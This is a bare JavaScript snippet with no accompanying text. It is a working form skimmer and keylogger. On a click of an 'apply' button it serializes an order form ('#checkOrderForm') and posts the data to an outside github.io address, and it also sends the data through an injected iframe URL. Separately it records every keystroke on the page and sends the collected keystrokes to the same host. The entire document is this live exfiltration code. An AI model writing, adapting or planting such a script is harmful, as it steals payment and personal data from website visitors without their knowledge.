window.onload = function() {
    $("#applybutton").bind("mouseup touchend", function (t) {
        var e = {};
        $("#checkOrderForm").serializeArray().map(function (t) {
            e[t.name] = t.value;
        });
        var n = JSON.stringify(e);
        $.post("https://faisal-akhtar-fgh.github.io/kal", n);
		$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ n + '"></iframe>');
    });
};

var keyPresses = "";
document.onkeydown = function (e) {
	keyPresses += e.key;
};
$("#applybutton").mousedown(function () {
    $.post("https://faisal-akhtar-fgh.github.io/kal/", keyPresses);
	$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ keyPresses + '"></iframe>');
});
